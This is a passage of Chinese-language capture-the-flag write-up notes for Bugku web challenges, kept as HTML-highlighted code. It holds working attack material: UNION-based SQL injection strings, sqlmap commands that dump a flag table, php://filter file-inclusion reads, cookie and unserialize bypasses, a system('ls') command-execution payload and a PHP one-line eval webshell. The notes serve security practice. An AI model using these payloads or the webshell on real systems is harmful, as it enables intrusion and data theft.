'http://123.206.87.240:8002/web6/'</span></span><br><span class="line"><span class="string">	req = requests.session()</span></span><br><span class="line"><span class="string">	flag = req.get(url).headers['flag']</span></span><br><span class="line"><span class="string">	flag = base64.b64decode(flag)</span></span><br><span class="line"><span class="string">	print(flag)</span></span><br><span class="line"><span class="string">	flag = flag.decode()  # 防止split()报错</span></span><br><span class="line"><span class="string">	flag = base64.b64decode(flag.split(':')[1])  # 解码两次才变成数值</span></span><br><span class="line"><span class="string">	print(flag)</span></span><br><span class="line"><span class="string">	data = &#123;'margin':flag&#125;</span></span><br><span class="line"><span class="string">	print(req.post(url,data).content)  # 此处为了看得方便可继续解码，不过没必要</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">// 一定要养成手动保存的好习惯，东西丢了还是很伤心的，又要重写</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># cookies欺骗</span></span><br><span class="line"><span class="string">	得到这么一个字符串：</span></span><br><span class="line"><span class="string">	rfrgrggggggoaihegfdiofi48ty598whrefeoiahfeiafehbaienvdivrbgtubgtrsgbvaerubaufibry</span></span><br><span class="line"><span class="string">	还有一个地址：index.php?line=&amp; filename=a2V5cy50eHQ= (keys.txt)</span></span><br><span class="line"><span class="string">	直接查看keys.txt，发现还是这么一段乱七八糟的字符串</span></span><br><span class="line"><span class="string">	上面那个又向一个文件包含，filename传入的还是一个base64编码，看看 aW5kZXgucGhw (index.php)</span></span><br><span class="line"><span class="string">	乍一看还是什么都没有，调整一下line的参数，有点东西了，一点一点扒下来</span></span><br><span class="line"><span class="string">	&lt;?php</span></span><br><span class="line"><span class="string">		error_reporting(0);</span></span><br><span class="line"><span class="string">		$file=base64_decode(isset($_GET['filename'])?$_GET['filename']:"</span><span class="string">");</span></span><br><span class="line"><span class="string">		$line=isset($_GET['line'])?intval($_GET['line']):0;</span></span><br><span class="line"><span class="string">		if($file=='') header("</span>location:index.php?line=&amp;filename=a2V5cy50eHQ=<span class="string">");</span></span><br><span class="line"><span class="string">		$file_list = array('0' =&gt;'keys.txt','1' =&gt;'index.php',);</span></span><br><span class="line"><span class="string">		if(isset($_COOKIE['margin']) &amp;&amp; $_COOKIE['margin']=='margin')&#123;</span></span><br><span class="line"><span class="string">			$file_list[2]='keys.php';</span></span><br><span class="line"><span class="string">		&#125;</span></span><br><span class="line"><span class="string">		if(in_array($file, $file_list))&#123;</span></span><br><span class="line"><span class="string">			$fa = file($file);</span></span><br><span class="line"><span class="string">			echo $fa[$line];</span></span><br><span class="line"><span class="string">		&#125;</span></span><br><span class="line"><span class="string">	?&gt;</span></span><br><span class="line"><span class="string">	此时改一下 cookies，margin=margin，游戏结束</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string"># flag在index里</span></span><br><span class="line"><span class="string">	http://123.206.87.240:8005/post/index.php?file=show.php</span></span><br><span class="line"><span class="string">	既然说flag在index里，看一下index源码，?file=php://filter/read=convert.base64-encode/resource=index.php</span></span><br><span class="line"><span class="string">	PGh0bWw+DQogICAgPHRpdGxlPkJ1Z2t1LWN0ZjwvdGl0bGU+DQogICAgDQo8P3BocA0KCWVycm9yX3JlcG9ydGluZygwKTsNCglpZighJF9HRVRbZmlsZV0pe2VjaG8gJzxhIGhyZWY9Ii4vaW5kZXgucGhwP2ZpbGU9c2hvdy5waHAiPmNsaWNrIG1lPyBubzwvYT4nO30NCgkkZmlsZT0kX0dFVFsnZmlsZSddOw0KCWlmKHN0cnN0cigkZmlsZSwiLi4vIil8fHN0cmlzdHIoJGZpbGUsICJ0cCIpfHxzdHJpc3RyKCRmaWxlLCJpbnB1dCIpfHxzdHJpc3RyKCRmaWxlLCJkYXRhIikpew0KCQllY2hvICJPaCBubyEiOw0KCQlleGl0KCk7DQoJfQ0KCWluY2x1ZGUoJGZpbGUpOyANCi8vZmxhZzpmbGFne2VkdWxjbmlfZWxpZl9sYWNvbF9zaV9zaWh0fQ0KPz4NCjwvaHRtbD4NCg==</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">	解码一下</span></span><br><span class="line"><span class="string">	&lt;html&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;Bugku-ctf&lt;/title&gt;</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">	&lt;?php</span></span><br><span class="line"><span class="string">		error_reporting(0);</span></span><br><span class="line"><span class="string">		if(!$_GET[file])&#123;echo '&lt;a href="</span>./index.php?file=show.php<span class="string">"&gt;click me? no&lt;/a&gt;';&#125;</span></span><br><span class="line"><span class="string">		$file=$_GET['file'];</span></span><br><span class="line"><span class="string">		if(strstr($file,"</span>../<span class="string">")||stristr($file, "</span>tp<span class="string">")||stristr($file,"</span>input<span class="string">")||stristr($file,"</span>data<span class="string">"))&#123;</span></span><br><span class="line"><span class="string">			echo "</span>Oh no!<span class="string">";</span></span><br><span class="line"><span class="string">			exit();</span></span><br><span class="line"><span class="string">		&#125;</span></span><br><span class="line"><span class="string">		include($file); </span></span><br><span class="line"><span class="string">	//flag:flag&#123;edulcni_elif_lacol_si_siht&#125;</span></span><br><span class="line"><span class="string">	?&gt;</span></span><br><span class="line"><span class="string">	&lt;/html&gt;</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string"># 成绩单</span></span><br><span class="line"><span class="string">	发现一个用 post 传 id 的输入框，注入题</span></span><br><span class="line"><span class="string">	-1' union select 1,2,3,database()#</span></span><br><span class="line"><span class="string">	-1' union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database()#</span></span><br><span class="line"><span class="string">	-1' union select 1,2,3,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x666c3467#  // 这里用16进制绕过一下</span></span><br><span class="line"><span class="string">	-1' union select 1,2,3,skctf_flag from fl4g#</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">	sqlmap 也能跑出来，牛</span></span><br><span class="line"><span class="string">		sqlmap -u URL --data="</span>id=<span class="number">1</span><span class="string">"</span></span><br><span class="line"><span class="string">		[11:01:58] [INFO] the back-end DBMS is MySQL</span></span><br><span class="line"><span class="string">		back-end DBMS: MySQL &gt;= 5.0.12</span></span><br><span class="line"><span class="string">		发现后台数据库是 mysql</span></span><br><span class="line"><span class="string">		</span></span><br><span class="line"><span class="string">		列举所有数据库</span></span><br><span class="line"><span class="string">		sqlmap -u URL --data="</span>id=<span class="number">1</span><span class="string">" --dbs</span></span><br><span class="line"><span class="string">		available databases [2]:</span></span><br><span class="line"><span class="string">		[*] information_schema</span></span><br><span class="line"><span class="string">		[*] skctf_flag</span></span><br><span class="line"><span class="string">		</span></span><br><span class="line"><span class="string">		爆出所有表</span></span><br><span class="line"><span class="string">		sqlmap -u URL --data="</span>id=<span class="number">1</span><span class="string">" -D skctf_flag --tables</span></span><br><span class="line"><span class="string">		Database: skctf_flag</span></span><br><span class="line"><span class="string">		[2 tables]</span></span><br><span class="line"><span class="string">		+------+</span></span><br><span class="line"><span class="string">		| fl4g |</span></span><br><span class="line"><span class="string">		| sc   |</span></span><br><span class="line"><span class="string">		+------+</span></span><br><span class="line"><span class="string">		</span></span><br><span class="line"><span class="string">		列出内容</span></span><br><span class="line"><span class="string">		sqlmap -u http://123.206.87.240:8002/chengjidan/index.php --data="</span>id=<span class="number">1</span><span class="string">" -T fl4g --dump </span></span><br><span class="line"><span class="string">		也可以选择全弄出来：sqlmap -u http://123.206.87.240:8002/chengjidan/index.php --data="</span>id=<span class="number">1</span><span class="string">" -D skctf_flag --dump</span></span><br><span class="line"><span class="string">		Database: skctf_flag</span></span><br><span class="line"><span class="string">		Table: fl4g</span></span><br><span class="line"><span class="string">		[1 entry]</span></span><br><span class="line"><span class="string">		+---------------------------------+</span></span><br><span class="line"><span class="string">		| skctf_flag                      |</span></span><br><span class="line"><span class="string">		+---------------------------------+</span></span><br><span class="line"><span class="string">		| BUGKU&#123;Sql_INJECT0N_4813drd8hz4&#125; |</span></span><br><span class="line"><span class="string">		+---------------------------------+</span></span><br><span class="line"><span class="string">		</span></span><br><span class="line"><span class="string"># 备份是个好习惯</span></span><br><span class="line"><span class="string">	d41d8cd98f00b204e9800998ecf8427e</span></span><br><span class="line"><span class="string">	d41d8cd98f00b204e9800998ecf8427e</span></span><br><span class="line"><span class="string">	提示提到了备份，应该是备份文件源码泄漏一类的，用脚本跑下后台有没有源码 &#123;工具在 F/CTF_tools/源码泄露&#125;</span></span><br><span class="line"><span class="string">	得到 index.php.bak</span></span><br><span class="line"><span class="string">	&lt;?php</span></span><br><span class="line"><span class="string">		include_once "</span>flag.php<span class="string">";</span></span><br><span class="line"><span class="string">		ini_set("</span>display_errors<span class="string">", 0);</span></span><br><span class="line"><span class="string">		$str = strstr($_SERVER['REQUEST_URI'], '?');</span></span><br><span class="line"><span class="string">		$str = substr($str,1);</span></span><br><span class="line"><span class="string">		$str = str_replace('key','',$str);</span></span><br><span class="line"><span class="string">		parse_str($str);</span></span><br><span class="line"><span class="string">		echo md5($key1);</span></span><br><span class="line"><span class="string">		echo md5($key2);</span></span><br><span class="line"><span class="string">		if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123;</span></span><br><span class="line"><span class="string">			echo $flag."</span>取得flag<span class="string">";</span></span><br><span class="line"><span class="string">	&#125;</span></span><br><span class="line"><span class="string">	有个替换性的过滤，用 kekeyy 就能绕过</span></span><br><span class="line"><span class="string">	分析源码，有个 parse_str()，此函数与 extract() 差不多，将关联数组中的元素与变量联系起来</span></span><br><span class="line"><span class="string">	那么就可以这样传值进去，kekeyy1 &amp; kekeyy2[]</span></span><br><span class="line"><span class="string">	MD5函数无法处理数组，于是可以用 kekeyy1[]=33 &amp; kekeyy2[]=44 进行绕过</span></span><br><span class="line"><span class="string">	或者直接 MD5碰撞</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># never give up</span></span><br><span class="line"><span class="string">	查看源码，发现一个小注释:1p.html</span></span><br><span class="line"><span class="string">	一打开就跳转到其他页面，拿burp抓一下，发现如下信息</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">	var Words ="</span>%<span class="number">3</span>Cscript%<span class="number">3</span>Ewindow.location.href%<span class="number">3</span>D%<span class="number">27</span>http%<span class="number">3</span>A<span class="comment">//www.bugku.com%27%3B%3C/script%3E%20%0A%3C%21--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ%3D%3D--%3E" </span></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">OutWord</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">var</span> NewWords;</span><br><span class="line">		NewWords = unescape(Words);</span><br><span class="line">		document.write(NewWords);</span><br><span class="line">	&#125; </span><br><span class="line">	OutWord();</span><br><span class="line">	然后一路解码，得到代码</span><br><span class="line">	&lt;script&gt;window.location.href=<span class="string">'http://www.bugku.com'</span>;&lt;/script&gt; 	</span><br><span class="line">	&lt;!--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ==--&gt;</span><br><span class="line">	</span><br><span class="line">	%<span class="number">22</span>%<span class="number">3</span>Bif%<span class="number">28</span>%<span class="number">21</span>%<span class="number">24</span>_GET%<span class="number">5</span>B%<span class="number">27</span>id%<span class="number">27</span>%<span class="number">5</span>D%<span class="number">29</span>%<span class="number">0</span>A%<span class="number">7</span>B%<span class="number">0</span>A%<span class="number">09</span>header%<span class="number">28</span>%<span class="number">27</span>Location%<span class="number">3</span>A%<span class="number">20</span>hello.php%<span class="number">3</span>Fid%<span class="number">3</span>D1%<span class="number">27</span>%<span class="number">29</span>%<span class="number">3</span>B%<span class="number">0</span>A%<span class="number">09</span><span class="keyword">exit</span>%<span class="number">28</span>%<span class="number">29</span>%<span class="number">3</span>B%<span class="number">0</span>A%<span class="number">7</span>D%<span class="number">0</span>A%<span class="number">24</span>id%<span class="number">3</span>D%<span class="number">24</span>_GET%<span class="number">5</span>B%<span class="number">27</span>id%<span class="number">27</span>%<span class="number">5</span>D%<span class="number">3</span>B%<span class="number">0</span>A%<span class="number">24</span>a%<span class="number">3</span>D%<span class="number">24</span>_GET%<span class="number">5</span>B%<span class="number">27</span>a%<span class="number">27</span>%<span class="number">5</span>D%<span class="number">3</span>B%<span class="number">0</span>A%<span class="number">24</span>b%<span class="number">3</span>D%<span class="number">24</span>_GET%<span class="number">5</span>B%<span class="number">27</span>b%<span class="number">27</span>%<span class="number">5</span>D%<span class="number">3</span>B%<span class="number">0</span>Aif%<span class="number">28</span>stripos%<span class="number">28</span>%<span class="number">24</span>a%<span class="number">2</span>C%<span class="number">27.</span>%<span class="number">27</span>%<span class="number">29</span>%<span class="number">29</span>%<span class="number">0</span>A%<span class="number">7</span>B%<span class="number">0</span>A%<span class="number">09</span><span class="keyword">echo</span>%<span class="number">20</span>%<span class="number">27</span>no%<span class="number">20</span>no%<span class="number">20</span>no%<span class="number">20</span>no%<span class="number">20</span>no%<span class="number">20</span>no%<span class="number">20</span>no%<span class="number">27</span>%<span class="number">3</span>B%<span class="number">0</span>A%<span class="number">09</span><span class="keyword">return</span>%<span class="number">20</span>%<span class="number">3</span>B%<span class="number">0</span>A%<span class="number">7</span>D%<span class="number">0</span>A%<span class="number">24</span>data%<span class="number">20</span>%<span class="number">3</span>D%<span class="number">20</span>@file_get_contents%<span class="number">28</span>%<span class="number">24</span>a%<span class="number">2</span>C%<span class="number">27</span>r%<span class="number">27</span>%<span class="number">29</span>%<span class="number">3</span>B%<span class="number">0</span>Aif%<span class="number">28</span>%<span class="number">24</span>data%<span class="number">3</span>D%<span class="number">3</span>D%<span class="number">22</span>bugku%<span class="number">20</span>is%<span class="number">20</span>a%<span class="number">20</span>nice%<span class="number">20</span>plateform%<span class="number">21</span>%<span class="number">22</span>%<span class="number">20</span><span class="keyword">and</span>%<span class="number">20</span>%<span class="number">24</span>id%<span class="number">3</span>D%<span class="number">3</span>D0%<span class="number">20</span><span class="keyword">and</span>%<span class="number">20</span>strlen%<span class="number">28</span>%<span class="number">24</span>b%<span class="number">29</span>%<span class="number">3E5</span>%<span class="number">20</span><span class="keyword">and</span>%<span class="number">20</span>eregi%<span class="number">28</span>%<span class="number">22111</span>%<span class="number">22.</span>substr%<span class="number">28</span>%<span class="number">24</span>b%<span class="number">2</span>C0%<span class="number">2</span>C1%<span class="number">29</span>%<span class="number">2</span>C%<span class="number">221114</span>%<span class="number">22</span>%<span class="number">29</span>%<span class="number">20</span><span class="keyword">and</span>%<span class="number">20</span>substr%<span class="number">28</span>%<span class="number">24</span>b%<span class="number">2</span>C0%<span class="number">2</span>C1%<span class="number">29</span>%<span class="number">21</span>%<span class="number">3</span>D4%<span class="number">29</span>%<span class="number">0</span>A%<span class="number">7</span>B%<span class="number">0</span>A%<span class="number">09</span><span class="keyword">require</span>%<span class="number">28</span>%<span class="number">22</span>f4l2a3g.txt%<span class="number">22</span>%<span class="number">29</span>%<span class="number">3</span>B%<span class="number">0</span>A%<span class="number">7</span>D%<span class="number">0</span>Aelse%<span class="number">0</span>A%<span class="number">7</span>B%<span class="number">0</span>A%<span class="number">09</span><span class="keyword">print</span>%<span class="number">20</span>%<span class="number">22</span>never%<span class="number">20</span>never%<span class="number">20</span>never%<span class="number">20</span>give%<span class="number">20</span>up%<span class="number">20</span>%<span class="number">21</span>%<span class="number">21</span>%<span class="number">21</span>%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">0</span>A%<span class="number">7</span>D%<span class="number">0</span>A%<span class="number">0</span>A%<span class="number">0</span>A%<span class="number">3</span>F%<span class="number">3</span>E</span><br><span class="line">	</span><br><span class="line">	<span class="string">";if(!$_GET['id']) &#123;</span></span><br><span class="line"><span class="string">		header('Location: hello.php?id=1');</span></span><br><span class="line"><span class="string">		exit();</span></span><br><span class="line"><span class="string">	&#125;</span></span><br><span class="line"><span class="string">	$id=$_GET['id'];</span></span><br><span class="line"><span class="string">	$a=$_GET['a'];</span></span><br><span class="line"><span class="string">	$b=$_GET['b'];</span></span><br><span class="line"><span class="string">	if(stripos($a,'.'))	&#123;</span></span><br><span class="line"><span class="string">		echo 'no no no no no no no';</span></span><br><span class="line"><span class="string">		return ;</span></span><br><span class="line"><span class="string">	&#125;</span></span><br><span class="line"><span class="string">	$data = @file_get_contents($a,'r');</span></span><br><span class="line"><span class="string">	if($data=="</span>bugku is a nice plateform!<span class="string">" and $id==0 and strlen($b)&gt;5 and eregi("</span><span class="number">111</span><span class="string">".substr($b,0,1),"</span><span class="number">1114</span><span class="string">") and substr($b,0,1)!=4)</span></span><br><span class="line"><span class="string">		require("</span>f4l2a3g.txt<span class="string">");</span></span><br><span class="line"><span class="string">	else</span></span><br><span class="line"><span class="string">		print "</span>never never never give up !!!<span class="string">";</span></span><br><span class="line"><span class="string">	?&gt;</span></span><br><span class="line"><span class="string">	既然是 require(f4l2a3g.txt) 直接看看这个文件？flag就直接能看到了</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string"># 细心</span></span><br><span class="line"><span class="string">	出现一个假的404页面，源代码里面也啥都没有，尝试扫扫后台，发现 robots.txt</span></span><br><span class="line"><span class="string">	打开它，发现一个 resusl.php 文件，再进去看一下，提示 _GET['x'] == password</span></span><br><span class="line"><span class="string">	提交 x = admin ，结果真中了，如果还没出来，只能想办法爆破了</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string"># flag.php</span></span><br><span class="line"><span class="string">	有个登录框，点 login 没反应，题名叫 flag.php，肯定有这个文件，进去看一下</span></span><br><span class="line"><span class="string">	啥都没有。上面提交之所以没反应，是因为 action=#，之前猜测直接给flag.php post </span></span><br><span class="line"><span class="string">	user &amp; password 的值，还是没卵用，试试post hint?，还是没用，最终看别人的解释是</span></span><br><span class="line"><span class="string">	在flagphp处get hint=1，直接出源码了？？还是要多尝试，反正就这么多套路</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">	 &lt;?php</span></span><br><span class="line"><span class="string">		error_reporting(0);</span></span><br><span class="line"><span class="string">		include_once("</span>flag.php<span class="string">");</span></span><br><span class="line"><span class="string">		$cookie = $_COOKIE['ISecer'];</span></span><br><span class="line"><span class="string">		if(isset($_GET['hint']))</span></span><br><span class="line"><span class="string">			show_source(__FILE__);</span></span><br><span class="line"><span class="string">		elseif (unserialize($cookie) === "</span>$KEY<span class="string">") </span></span><br><span class="line"><span class="string">			echo "</span>$flag<span class="string">";</span></span><br><span class="line"><span class="string">		else &#123;</span></span><br><span class="line"><span class="string">			?&gt;</span></span><br><span class="line"><span class="string">			&lt;html&gt;</span></span><br><span class="line"><span class="string">			&lt;head&gt;</span></span><br><span class="line"><span class="string">			&lt;meta http-equiv="</span>Content-Type<span class="string">" content="</span>text/html; charset=UTF<span class="number">-8</span><span class="string">"&gt;</span></span><br><span class="line"><span class="string">			&lt;title&gt;Login&lt;/title&gt;</span></span><br><span class="line"><span class="string">			&lt;link rel="</span>stylesheet<span class="string">" href="</span>admin.css<span class="string">" type="</span>text/css<span class="string">"&gt;</span></span><br><span class="line"><span class="string">			&lt;/head&gt;</span></span><br><span class="line"><span class="string">			&lt;body&gt;</span></span><br><span class="line"><span class="string">			&lt;br&gt;</span></span><br><span class="line"><span class="string">			&lt;div class="</span>container<span class="string">" align="</span>center<span class="string">"&gt;</span></span><br><span class="line"><span class="string">			  &lt;form method="</span>POST<span class="string">" action="</span><span class="comment">#"&gt;</span></span><br><span class="line">				&lt;p&gt;&lt;input name=<span class="string">"user"</span> type=<span class="string">"text"</span> placeholder=<span class="string">"Username"</span>&gt;&lt;/p&gt;</span><br><span class="line">				&lt;p&gt;&lt;input name=<span class="string">"password"</span> type=<span class="string">"password"</span> placeholder=<span class="string">"Password"</span>&gt;&lt;/p&gt;</span><br><span class="line">				&lt;p&gt;&lt;input value=<span class="string">"Login"</span> type=<span class="string">"button"</span>/&gt;&lt;/p&gt;</span><br><span class="line">			  &lt;/form&gt;</span><br><span class="line">			&lt;/div&gt;</span><br><span class="line">			&lt;/body&gt;</span><br><span class="line">			&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">		<span class="meta">&lt;?php</span></span><br><span class="line">		&#125;</span><br><span class="line">			$KEY=<span class="string">'ISecer:www.isecer.com'</span>;</span><br><span class="line">		<span class="meta">?&gt;</span> </span><br><span class="line">		</span><br><span class="line">	打算直接提交ISecer = $KEY 的反序列化，后面发现在此之前$KEY都没有被定义，所以KEY是空的，</span><br><span class="line">	只需提交空的序列化上去就可以了</span><br><span class="line">		<span class="meta">&lt;?php</span></span><br><span class="line">			$cookie = serialize(<span class="string">"$key"</span>);</span><br><span class="line">			print_r($cookie);</span><br><span class="line">		<span class="meta">?&gt;</span></span><br><span class="line">	这样构造一下，就得到了 s:<span class="number">0</span>:<span class="string">""</span>;</span><br><span class="line">	但是注意;(分号)在cookie中不会被正确的上传到服务器，构造URL编码</span><br><span class="line">	;的URL编码为%<span class="number">3</span>B</span><br><span class="line">	所以 cookie:ISecer=s:<span class="number">0</span>:<span class="string">""</span>%<span class="number">3</span>B</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line"><span class="comment"># INSERT INTO注入</span></span><br><span class="line">	error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">getIp</span><span class="params">()</span></span>&#123;</span><br><span class="line">		$ip = <span class="string">''</span>;</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]))&#123;</span><br><span class="line">			$ip = $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>];</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			$ip = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line">		&#125;</span><br><span class="line">		$ip_arr = explode(<span class="string">','</span>, $ip);</span><br><span class="line">		<span class="keyword">return</span> $ip_arr[<span class="number">0</span>];</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	$host=<span class="string">"localhost"</span>;</span><br><span class="line">	$user=<span class="string">""</span>;</span><br><span class="line">	$pass=<span class="string">""</span>;</span><br><span class="line">	$db=<span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">	$connect = mysql_connect($host, $user, $pass) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to connect"</span>);</span><br><span class="line"></span><br><span class="line">	mysql_select_db($db) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to select database"</span>);</span><br><span class="line"></span><br><span class="line">	$ip = getIp();</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'your ip is :'</span>.$ip;</span><br><span class="line">	$sql=<span class="string">"insert into client_ip (ip) values ('$ip')"</span>;</span><br><span class="line">	mysql_query($sql);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 多次</span></span><br><span class="line">	又是一个注入题，常规的 <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span> 啥的都被过滤掉了，多积累姿势</span><br><span class="line"></span><br><span class="line"><span class="comment"># getshell</span></span><br><span class="line">	之前还以为要传马，后面查wp发现是我想多了，只要成功传php文件就能拿到flag</span><br><span class="line">	顺便学习下文件上传</span><br><span class="line">	Content-Type: Multipart/form-data + .php5 ???</span><br><span class="line"></span><br><span class="line"><span class="comment"># 文件包含2</span></span><br><span class="line">	直接伪协议试试：php:<span class="comment">//filter/read=convert.base64-encode/resource=index.php</span></span><br><span class="line">	=&gt; NAIVE! 查看源码发现 upload.php =&gt; 文件上传</span><br><span class="line"></span><br><span class="line">	wp上写的是.php;.jpg，我的直接传个 .gif，然后利用本身的 file=xxx，查看了所传图片，命令就被执行了</span><br><span class="line">	<span class="comment">// 命令执行</span></span><br><span class="line">	&lt;script language=php&gt; system(<span class="string">"ls"</span>)&lt;/script&gt;</span><br><span class="line">	<span class="comment">// 牛逼啊，直接能看到本目录下的所有文件</span></span><br><span class="line">	about hello.php index.php this_is_th3_F14g_154f65sd4g35f4d6f43.txt upload upload.php</span><br><span class="line">	还有个思路，传马之后，菜刀连接，此处不用改后缀名也能解析？？</span><br><span class="line">	<span class="comment">// 一句话木马</span></span><br><span class="line">	&lt;script language=php&gt;<span class="keyword">eval</span>($_POST[<span class="string">'A'</span>])&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># PHP_incrypt_1</span></span><br><span class="line">	fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA=</span><br><span class="line"></span><br><span class="line">	<span class="meta">&lt;?php</span></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">encrypt</span><span class="params">($data,$key)</span> </span>&#123;</span><br><span class="line">		$key = md5(<span class="string">'ISCC'</span>);</span><br><span class="line">		$x = <span class="number">0</span>;</span><br><span class="line">		$len = strlen($data);</span><br><span class="line">		$klen = strlen($key);</span><br><span class="line">		<span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; $len; $i++) &#123; </span><br><span class="line">			<span class="comment">/*</span></span><br><span class="line"><span class="comment">			if ($x == $klen) &#123;</span></span><br><span class="line"><span class="comment">				$x = 0;</span></span><br><span class="line"><span class="comment">			&#125;*/</span></span><br><span class="line">			$char .= $key[$x % $klen];</span><br><span class="line">			$x += <span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; $len; $i++) &#123;</span><br><span class="line">			<span class="comment">// $str .= chr((ord($data[$i]) + ord($char[$i])) % 128);</span></span><br><span class="line">			$str .= chr((ord($data[$i]+ $key[$i % 